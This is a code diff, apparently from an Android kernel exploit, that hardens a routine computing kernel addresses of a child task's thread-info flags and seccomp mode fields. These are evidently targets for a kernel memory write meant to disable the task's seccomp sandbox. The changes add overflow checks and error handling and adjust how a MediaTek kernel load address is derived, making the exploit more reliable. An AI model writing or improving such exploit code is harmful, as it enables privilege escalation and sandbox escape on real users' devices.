@@ -15,6 +15,7 @@
 #include <sys/system_properties.h>
 #include <sys/utsname.h>
 #include <strings.h>
+#include <stdint.h>
 
 const struct kernel_offsets *active_offsets = NULL;
 
@@ -93,7 +94,7 @@ static void publish_active_offsets(void) {
     p0_kernel_phys_load = active_offsets->kernel_phys_load;
   }
   int mtk = soc_is_mtk();
-  if (mtk) {
+  if (mtk && !active_offsets->kernel_phys_load) {
     p0_kernel_phys_load = KIMAGE_TEXT_BASE - MTK_VADDR_BASE;
   }
   pr_info("soc: %s; kernel_phys_load=0x%llx\n",
@@ -862,10 +863,38 @@ static void w3_compute_targets(uintptr_t child_task, int leaf_to_target8,
                                uintptr_t *flags_target,
                                uintptr_t *mode_target) {
   if (leaf_to_target8) {
+    /* Prevent underflow: child_task should be > 8 for this calculation */
+    if (child_task <= 8) {
+      pr_error("W3: child_task=0x%zx too small for leaf_to_target8=1\n", child_task);
+      *flags_target = 0;
+      *mode_target = 0;
+      return;
+    }
     *flags_target = child_task - 8;
+    /* Check for overflow in mode_target calculation: (child_task + TASK_SECCOMP_OFF - 8) */
+    /* First check if child_task + TASK_SECCOMP_OFF would overflow */
+    if (child_task > UINTPTR_MAX - TASK_SECCOMP_OFF) {
+      pr_error("W3: child_task=0x%zx would overflow in mode_target calculation (step 1)\n", child_task);
+      *mode_target = 0;
+      return;
+    }
+    /* Then check if (child_task + TASK_SECCOMP_OFF) - 8 would underflow (shouldn't happen if child_task > 8) */
     *mode_target = child_task + TASK_SECCOMP_OFF - 8;
   } else {
+    /* Check for overflow in flags_target calculation */
+    if (child_task > UINTPTR_MAX - TASK_THREAD_INFO_FLAGS_OFF) {
+      pr_error("W3: child_task=0x%zx would overflow in flags_target calculation\n", child_task);
+      *flags_target = 0;
+      *mode_target = 0;
+      return;
+    }
     *flags_target = child_task + TASK_THREAD_INFO_FLAGS_OFF;
+    /* Check for overflow in mode_target calculation */
+    if (child_task > UINTPTR_MAX - TASK_SECCOMP_OFF) {
+      pr_error("W3: child_task=0x%zx would overflow in mode_target calculation\n", child_task);
+      *mode_target = 0;
+      return;
+    }
     *mode_target = child_task + TASK_SECCOMP_OFF;
   }
 }
@@ -878,6 +907,13 @@ static int try_w3_seccomp_direction(pid_t child,
                                     int attempts) {
   uintptr_t flags_target, mode_target;
   w3_compute_targets(child_task, leaf_to_target8, &flags_target, &mode_target);
+
+  /* Check if target calculation failed */
+  if (flags_target == 0 || mode_target == 0) {
+    pr_warning("W3: target calculation failed for leaf_to_target8=%d, skipping attempt\n", leaf_to_target8);
+    return 0;
+  }
+
   pr_info("W3 direction leaf_to_target8=%d flags=0x%016zx mode=0x%016zx\n",
           leaf_to_target8, flags_target, mode_target);
 
